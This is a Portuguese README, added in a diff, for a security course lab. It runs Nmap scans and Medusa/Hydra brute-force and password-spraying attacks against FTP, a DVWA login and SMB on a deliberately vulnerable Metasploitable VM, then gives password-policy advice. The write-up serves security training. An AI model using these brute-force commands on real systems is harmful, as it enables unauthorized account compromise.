@@ -1,0 +1,69 @@
+dio-desafio-simulado-bruteforce
+Técnicas e Ferramentas Apresentadas
+Durante este módulo, foram abordadas técnicas e ferramentas voltadas para:
+
+Varredura de rede (Network Scanning) utilizando o Nmap.
+Ataques de força bruta (Brute Force) para descoberta de credenciais.
+Análise de vulnerabilidades em serviços como o FTP, SMB e Serviços Web
+Ferramenta Nmap
+O Nmap é utilizado para:
+
+Descobrir hosts em uma rede, seja por broadcast ou diretamente via IP/FQDN.
+Identificar portas abertas e serviços ativos.
+Detectar possíveis vulnerabilidades que podem ser exploradas por atacantes.
+Ataques de Força Bruta
+A técnica de Brute Force consiste em realizar múltiplas tentativas de login para descobrir combinações válidas de usuário e senha. Esse tipo de ataque explora:
+
+Sistemas mal configurados.
+Vulnerabilidades humanas, como:
+Uso de senhas fracas ou repetidas.
+Falta de política de troca periódica.
+Reutilização de senhas em múltiplos serviços.
+Senhas vazadas disponíveis publicamente.
+Geração de Wordlists
+Utilizando a interface CLI, foram geradas listas de usuários e senhas (Wordlists) para alimentar ferramentas de ataque. Também foram utilizadas Wordlists disponíveis na internet, que contêm credenciais vazadas e podem ser empregadas em testes de segurança.
+
+Ambiente de Testes
+O exercício foi realizado em ambiente controlado, com os seguintes componentes:
+
+Estação de trabalho com os requisitos necessários.
+Oracle VirtualBox com Extension Pack instalado.
+Kali Linux pré-configurado para VirtualBox, contendo ferramentas de análise de segurança.
+Metasploitable, uma máquina virtual propositalmente vulnerável para fins de teste. As máquinas virtuais foram importadas no VirtualBox e configuradas em uma rede interna, permitindo a execução dos testes.
+Comandos Executados
+Após integração das VMs na mesma faixa de rede interna, foram utilizados os seguintes comandos:
+
+nmap 192.168.100.1 nmap -sV -p 211,22,80,443,139 192.168.100.1 ftp 192.168.100.1
+
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt echo -e "123456\npassword\nquerty\nmsfadmin" > pass.txt
+
+medusa -h 192.168.100.1 -U users.txt -P pass.txt -M ftp -t 6 medusa -h 192.168.100.1 -U users.txt -P pass.txt -M http
+-m PAGE:'/dvwa/login.php'
+-m FORM:'username=^USER^&password=^PASS^&Login=Login'
+-m 'FAIL=login failed' -t 6
+
+hydra -L users.txt -P pass.txt 192.168.100.1 http-post-form
+"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+
+enum4linux -a 192.168.100.1 | tee enum4_output.txt
+
+echo -e "user\nmsfadmin\nservice" > smb_users.txt echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+
+medusa -h 192.168.100.1 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T50 smbclient -L //192.168.100.1 -U msfadmin
+
+Considerações sobre Segurança
+O ambiente de testes apresenta vulnerabilidades intencionais, como:
+
+Serviços mal configurados.
+Uso de credenciais fracas ou vazadas.
+Recomendações para ambientes reais:
+Nunca expor esses serviços diretamente à internet.
+Utilizar versões atualizadas e seguras dos serviços.
+Implementar firewall e suíte de segurança Endpoint.
+Políticas de Senhas e Autenticação
+Para mitigar riscos, recomenda-se:
+
+Senhas com no mínimo 14 caracteres, incluindo letras maiúsculas, minúsculas, números e caracteres especiais.
+Troca periódica de senhas, com restrição à reutilização.
+Bloqueio de conta após 5 tentativas de login inválidas.
+Implementação de autenticação em dois fatores (2FA).
